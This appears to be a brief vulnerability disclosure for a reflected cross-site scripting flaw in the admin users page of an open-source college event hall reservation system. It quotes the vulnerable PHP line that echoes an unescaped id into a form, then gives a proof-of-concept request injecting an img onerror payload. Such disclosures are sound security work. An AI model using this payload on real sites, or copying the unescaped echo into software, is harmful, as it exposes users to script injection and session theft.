# MAGESH-K21 / Online-College-Event-Hall-Reservation-System - Reflected XSS users.php

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://github.com/MAGESH-K21/Online-College-Event-Hall-Reservation-System/

## Affected Component
> /admin/users.php

## Code
```php
<form action="users.php?id=<?php echo $id;?>" method="POST">
```

## Proof of Concept
**HTTP Request Example**
``` http request
GET /admin/update-users.php?id="><img+src%3dx+onerror%3dalert("NoChizPlz")> HTTP/1.1
Host: [REDACTED]
```

## Screenshot


